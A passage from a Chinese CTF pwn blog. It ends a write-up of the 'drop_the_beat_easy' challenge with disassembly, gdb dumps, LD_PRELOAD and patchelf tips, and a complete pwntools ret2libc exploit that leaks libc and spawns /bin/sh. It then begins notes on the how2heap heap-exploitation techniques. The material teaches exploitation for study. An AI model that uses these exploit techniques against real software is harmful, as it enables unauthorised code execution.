<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804864F</span>                 call    _puts</span><br><span class="line">.text:<span class="number">08048654</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">08048657</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0804865</span>C                 jmp     <span class="keyword">short</span> locret_8048672</span><br><span class="line">.text:<span class="number">0804865</span>E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0804865</span>E</span><br><span class="line">.text:<span class="number">0804865</span>E loc_804865E:                            ; CODE XREF: main+E1↑j</span><br><span class="line">.text:<span class="number">0804865</span>E                 push    offset aSorryYouCanTBe ; <span class="string">":( Sorry, You Can't be with us..."</span></span><br><span class="line">.text:<span class="number">08048663</span>                 call    _puts</span><br><span class="line">.text:<span class="number">08048668</span>                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804866B</span>                 push    <span class="number">1</span>               ; status</span><br><span class="line">.text:<span class="number">0804866</span>D                 call    _exit</span><br><span class="line">.text:<span class="number">08048672</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048672</span></span><br><span class="line">.text:<span class="number">08048672</span> locret_8048672:                         ; CODE XREF: main+<span class="number">121</span>↑j</span><br><span class="line">.text:<span class="number">08048672</span>                 leave</span><br><span class="line">.text:<span class="number">08048673</span>                 retn</span><br><span class="line">.text:<span class="number">08048673</span> ; &#125; <span class="comment">// starts at 804853B</span></span><br><span class="line">.text:<span class="number">08048673</span> main            endp</span><br><span class="line">.text:<span class="number">08048673</span></span><br></pre></td></tr></table></figure>

<p>我们就一般下在<strong>0x08048672</strong>处，然后开始调试一遍错误的payload</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : <span class="number">0x0</span>       </span><br><span class="line">$ebx   : <span class="number">0x0</span>       </span><br><span class="line">$ecx   : <span class="number">0xffffffff</span></span><br><span class="line">$edx   : <span class="number">0xf7ed9870</span>  →  <span class="number">0x00000000</span></span><br><span class="line">$esp   : <span class="number">0xffd211ac</span>  →  <span class="number">0x080483e0</span>  →  &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt; jmp DWORD PTR ds:<span class="number">0x804a010</span></span><br><span class="line">$ebp   : <span class="number">0x41414141</span> (<span class="string">"AAAA"</span>?)</span><br><span class="line">$esi   : <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$edi   : <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">$eip   : <span class="number">0x08048673</span>  →  &lt;main+<span class="number">312</span>&gt; ret </span><br><span class="line">$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: <span class="number">0x0023</span> $ss: <span class="number">0x002b</span> $ds: <span class="number">0x002b</span> $es: <span class="number">0x002b</span> $fs: <span class="number">0x0000</span> $gs: <span class="number">0x0063</span> </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── <span class="built_in">stack</span> ────</span><br><span class="line"><span class="number">0xffd211ac</span>│+<span class="number">0x0000</span>: <span class="number">0x080483e0</span>  →  &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt; jmp DWORD PTR ds:<span class="number">0x804a010</span>	 ← $esp</span><br><span class="line"><span class="number">0xffd211b0</span>│+<span class="number">0x0004</span>: <span class="number">0x0804a018</span>  →  <span class="number">0xf7d3e540</span>  →  &lt;__libc_start_main+<span class="number">0</span>&gt; call <span class="number">0xf7e45b59</span> &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"><span class="number">0xffd211b4</span>│+<span class="number">0x0008</span>: <span class="number">0x0804853b</span>  →  &lt;main+<span class="number">0</span>&gt; push ebp</span><br><span class="line"><span class="number">0xffd211b8</span>│+<span class="number">0x000c</span>: <span class="number">0xffd2124c</span>  →  <span class="number">0xffd2330d</span>  →  <span class="string">"QT_QPA_PLATFORMTHEME=appmenu-qt5"</span></span><br><span class="line"><span class="number">0xffd211bc</span>│+<span class="number">0x0010</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c0</span>│+<span class="number">0x0014</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c4</span>│+<span class="number">0x0018</span>: <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffd211c8</span>│+<span class="number">0x001c</span>: <span class="number">0xf7ed8000</span>  →  <span class="number">0x001b1db0</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────── code:x86:<span class="number">32</span> ────</span><br><span class="line">    <span class="number">0x8048667</span> &lt;main+<span class="number">300</span>&gt;       inc    DWORD PTR [ebx+<span class="number">0x16a04c4</span>]</span><br><span class="line">    <span class="number">0x804866d</span> &lt;main+<span class="number">306</span>&gt;       call   <span class="number">0x80483f0</span> &lt;<span class="built_in">exit</span>@plt&gt;</span><br><span class="line">    <span class="number">0x8048672</span> &lt;main+<span class="number">311</span>&gt;       leave  </span><br><span class="line"> →  <span class="number">0x8048673</span> &lt;main+<span class="number">312</span>&gt;       ret    </span><br><span class="line">   ↳   <span class="number">0x80483e0</span> &lt;<span class="built_in">puts</span>@plt+<span class="number">0</span>&gt;     jmp    DWORD PTR ds:<span class="number">0x804a010</span></span><br></pre></td></tr></table></figure>

<p>可以发现函数的返回地址是错误的，然后我们运行一遍正确的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0       </span><br><span class="line">$ebx   : 0x0       </span><br><span class="line">$ecx   : 0xffffffff</span><br><span class="line">$edx   : 0xf7f9a870  →  0x00000000</span><br><span class="line">$esp   : 0xffddb3fc  →  0x080483e0  →  &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010</span><br><span class="line">$ebp   : 0x41414141 (&quot;AAAA&quot;?)</span><br><span class="line">$esi   : 0xf7f99000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7f99000  →  0x001b1db0</span><br><span class="line">$eip   : 0x08048673  →  &lt;main+312&gt; ret </span><br><span class="line">$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 </span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffddb3fc│+0x0000: 0x080483e0  →  &lt;puts@plt+0&gt; jmp DWORD PTR ds:0x804a010	 ← $esp</span><br><span class="line">0xffddb400│+0x0004: 0x0804853b  →  &lt;main+0&gt; push ebp</span><br><span class="line">0xffddb404│+0x0008: 0x0804a018  →  0xf7dff540  →  &lt;__libc_start_main+0&gt; call 0xf7f06b59 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">0xffddb408│+0x000c: 0xffddb49c  →  0xffddd30d  →  &quot;QT_QPA_PLATFORMTHEME=appmenu-qt5&quot;</span><br><span class="line">0xffddb40c│+0x0010: 0x00000000</span><br><span class="line">0xffddb410│+0x0014: 0x00000000</span><br><span class="line">0xffddb414│+0x0018: 0x00000000</span><br><span class="line">0xffddb418│+0x001c: 0xf7f99000  →  0x001b1db0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8048667 &lt;main+300&gt;       inc    DWORD PTR [ebx+0x16a04c4]</span><br><span class="line">    0x804866d &lt;main+306&gt;       call   0x80483f0 &lt;exit@plt&gt;</span><br><span class="line">    0x8048672 &lt;main+311&gt;       leave  </span><br><span class="line"> →  0x8048673 &lt;main+312&gt;       ret    </span><br><span class="line">   ↳   0x80483e0 &lt;puts@plt+0&gt;     jmp    DWORD PTR ds:0x804a010</span><br><span class="line">       0x80483e6 &lt;puts@plt+6&gt;     push   0x8</span><br><span class="line">       0x80483eb &lt;puts@plt+11&gt;    jmp    0x80483c0</span><br><span class="line">       0x80483f0 &lt;exit@plt+0&gt;     jmp    DWORD PTR ds:0x804a014</span><br><span class="line">       0x80483f6 &lt;exit@plt+6&gt;     push   0x10</span><br><span class="line">       0x80483fb &lt;exit@plt+11&gt;    jmp    0x80483c0</span><br></pre></td></tr></table></figure>

<p>可以发现返回地址正确了</p>
<p>总之第一点就是下断点可以下在<code>leave</code>处</p>
<p>还有就是在程序为完全静态编译没有调用动态库的时候也是可以知道一些相关的编译信息的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings ./binary_name | grep GCC</span><br><span class="line">确定Ubuntu多少版本和gcc版本</span><br></pre></td></tr></table></figure>

<p>例如这题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$  strings ./drop_the_beat_easy | grep GCC</span><br><span class="line">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609</span><br></pre></td></tr></table></figure>

<p>还有一个命令是可以查看当前程序的动态加载库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ ldd ./drop_the_beat_easy</span><br><span class="line">	linux-gate.so.1 =&gt;  (0xf7f18000)</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d41000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f1a000)</span><br></pre></td></tr></table></figure>

<p>然后在题目给了libc的情况下，我们的程序如果没有经过修改就运行的话，调用的是我们本机的libc库，所以我们需要修改他的动态加载库</p>
<p>在写exp的时候可以这样写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process(&quot;./drop_the_beat_easy&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>后面的env就是动态加载库的文件</p>
<p>我们还可以通过安装 patchelf 来直接重定位软件的动态加载库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf  --set-interpreter /mnt/hgfs/shared/multi_version_ld/ld-2.23_x86-64.so.2 ./babystack</span><br></pre></td></tr></table></figure>

<p>patchelf 的更多命令还是通过help进行查看</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ patchelf --help</span><br><span class="line">syntax: patchelf</span><br><span class="line">  [--<span class="built_in">set</span>-interpreter FILENAME]</span><br><span class="line">  [--page-size SIZE]</span><br><span class="line">  [--print-interpreter]</span><br><span class="line">  [--print-soname]		Prints 'DT_SONAME' entry of .dynamic section. Raises an error if DT_SONAME doesn't exist</span><br><span class="line">  [--set-soname SONAME]		Sets 'DT_SONAME' entry to SONAME.</span><br><span class="line">  [--<span class="built_in">set</span>-rpath RPATH]</span><br><span class="line">  [--remove-rpath]</span><br><span class="line">  [--shrink-rpath]</span><br><span class="line">  [--print-rpath]</span><br><span class="line">  [--force-rpath]</span><br><span class="line">  [--add-needed LIBRARY]</span><br><span class="line">  [--remove-needed LIBRARY]</span><br><span class="line">  [--replace-needed LIBRARY NEW_LIBRARY]</span><br><span class="line">  [--print-needed]</span><br><span class="line">  [--no-<span class="keyword">default</span>-lib]</span><br><span class="line">  [--debug]</span><br><span class="line">  [--version]</span><br><span class="line">  FILENAME</span><br></pre></td></tr></table></figure>

<p>还有就是接受的问题，有时候接受可能会多一个或者少一个换行符，可以先用recv一次全部查看一下接受的内容</p>
<p>最后最终的EXP就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./drop_the_beat_easy"</span>,env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">'./drop_the_beat_easy'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048672")</span></span><br><span class="line">libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(main)</span><br><span class="line"><span class="keyword">print</span> hex(puts_plt)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(puts_plt)+p32(main)+p32(libc_start_main_got)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Wow... That's AWESOME!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#info(p.recv())</span></span><br><span class="line">libc.address = u32(p.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc.symbols[<span class="string">"system"</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">104</span>+p32(libc.symbols[<span class="string">"system"</span>])*<span class="number">2</span>+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'2) No Beat For You..!\n'</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Give Me a Beat!!\n'</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>还有就是可以在 <code>/usr/include/asm/unistd_32.h</code>直接查看32位系统的系统调用号，配合<code>grep</code>效果更好</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Downloads/Pwnable/dRop_the_beat$ cat /usr/include/<span class="keyword">asm</span>/unistd_64.h | grep execve</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execveat 322</span></span><br></pre></td></tr></table></figure>

<p>还有就是熟练使用ROPgadget生成ROP chain</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/30/how2heap▒╩╝╟0x01/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/30/how2heap▒╩╝╟0x01/" class="post-title-link" itemprop="url">how2heap笔记0x01</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-30 08:43:45 / Modified: 23:44:22" itemprop="dateCreated datePublished" datetime="2019-10-30T08:43:45-07:00">2019-10-30</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>how2heap</strong>是<strong>shellphish</strong>团队在<strong>Github</strong>上开源的堆漏洞系列教程，地址链接:<a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">https://github.com/shellphish/how2heap</a></p>
<table>
<thead>
<tr>
<th>File</th>
<th>Technique</th>
<th>Glibc-Version</th>
<th>Applicable CTF Challenges</th>
</tr>
</thead>
<tbody><tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/first_fit.c" target="_blank" rel="noopener">first_fit.c</a></td>
<td>Demonstrating glibc malloc’s first-fit behavior.</td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">fastbin_dup.c</a></td>
<td>Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.</td>
<td></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c" target="_blank" rel="noopener">fastbin_dup_into_stack.c</a></td>
<td>Tricking malloc into returning a nearly-arbitrary pointer by abusing the fastbin freelist.</td>
<td>latest</td>
<td><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine" target="_blank" rel="noopener">9447-search-engine</a>, <a href="http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html" target="_blank" rel="noopener">0ctf 2017-babyheap</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_consolidate.c" target="_blank" rel="noopener">fastbin_dup_consolidate.c</a></td>
<td>Tricking malloc into returning an already-allocated heap pointer by  putting a pointer on both fastbin freelist and unsorted bin freelist.</td>
<td>latest</td>
<td><a href="https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder" target="_blank" rel="noopener">Hitcon 2016 SleepyHolder</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c" target="_blank" rel="noopener">unsafe_unlink.c</a></td>
<td>Exploiting free on a corrupted chunk to get arbitrary write.</td>
<td>&lt; 2.26</td>
<td><a href="http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/" target="_blank" rel="noopener">HITCON CTF 2014-stkof</a>, <a href="https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a" target="_blank" rel="noopener">Insomni’hack 2017-Wheel of Robots</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c" target="_blank" rel="noopener">house_of_spirit.c</a></td>
<td>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer.</td>
<td>latest</td>
<td><a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo" target="_blank" rel="noopener">hack.lu CTF 2014-OREO</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/poison_null_byte.c" target="_blank" rel="noopener">poison_null_byte.c</a></td>
<td>Exploiting a single null byte overflow.</td>
<td>&lt; 2.26</td>
<td><a href="https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb" target="_blank" rel="noopener">PlaidCTF 2015-plaiddb</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_lore.c" target="_blank" rel="noopener">house_of_lore.c</a></td>
<td>Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist.</td>
<td>&lt; 2.26</td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/overlapping_chunks.c" target="_blank" rel="noopener">overlapping_chunks.c</a></td>
<td>Exploit the overwrite of a freed chunk size in the unsorted bin in order to make a new allocation overlap with an existing chunk</td>
<td>&lt; 2.26</td>
<td><a href="https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore" target="_blank" rel="noopener">hack.lu CTF 2015-bookstore</a>, <a href="https://github.com/ctfs/write-ups-2016/tree/master/nuitduhack-quals-2016/exploit-me/night-deamonic-heap-400" target="_blank" rel="noopener">Nuit du Hack 2016-night-deamonic-heap</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/overlapping_chunks_2.c" target="_blank" rel="noopener">overlapping_chunks_2.c</a></td>
<td>Exploit the overwrite of an in use chunk size in order to make a new allocation overlap with an existing chunk</td>
<td>latest</td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c" target="_blank" rel="noopener">house_of_force.c</a></td>
<td>Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer</td>
<td>&lt; 2.29</td>
<td><a href="https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6" target="_blank" rel="noopener">Boston Key Party 2016-cookbook</a>, <a href="https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200" target="_blank" rel="noopener">BCTF 2016-bcloud</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_into_stack.c" target="_blank" rel="noopener">unsorted_bin_into_stack.c</a></td>
<td>Exploiting the overwrite of a freed chunk on unsorted bin freelist to return a nearly-arbitrary pointer.</td>
<td>&lt; 2.26</td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c" target="_blank" rel="noopener">unsorted_bin_attack.c</a></td>
<td>Exploiting the overwrite of a freed chunk on unsorted bin freelist to write a large value into arbitrary address</td>
<td>&lt; 2.28</td>
<td><a href="https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6" target="_blank" rel="noopener">0ctf 2016-zerostorage</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/large_bin_attack.c" target="_blank" rel="noopener">large_bin_attack.c</a></td>
<td>Exploiting the overwrite of a freed chunk on large bin freelist to write a large value into arbitrary address</td>
<td>&lt; 2.26</td>
<td><a href="https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/" target="_blank" rel="noopener">0ctf 2018-heapstorm2</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_einherjar.c" target="_blank" rel="noopener">house_of_einherjar.c</a></td>
<td>Exploiting a single null byte overflow to trick malloc into returning a controlled pointer</td>
<td>&lt; 2.26</td>
<td><a href="https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf" target="_blank" rel="noopener">Seccon 2016-tinypad</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c" target="_blank" rel="noopener">house_of_orange.c</a></td>
<td>Exploiting the Top Chunk (Wilderness) in order to gain arbitrary code execution</td>
<td>&lt; 2.26</td>
<td><a href="https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/house-of-orange-500" target="_blank" rel="noopener">Hitcon 2016 houseoforange</a></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c" target="_blank" rel="noopener">tcache_dup.c</a></td>
<td>Tricking malloc into returning an already-allocated heap pointer by abusing the tcache freelist.</td>
<td>2.26 - 2.28</td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c" target="_blank" rel="noopener">tcache_poisoning.c</a></td>
<td>Tricking malloc into returning a completely arbitrary pointer by abusing the tcache freelist.</td>
<td>&gt; 2.25</td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_house_of_spirit.c" target="_blank" rel="noopener">tcache_house_of_spirit.c</a></td>
<td>Frees a fake chunk to get malloc to return a nearly-arbitrary pointer.</td>
<td>&gt; 2.25</td>
<td></td>
</tr>
</tbody></table>
<h1 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first_fit"></a>0x01 <strong>first_fit</strong></h1><p>源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't 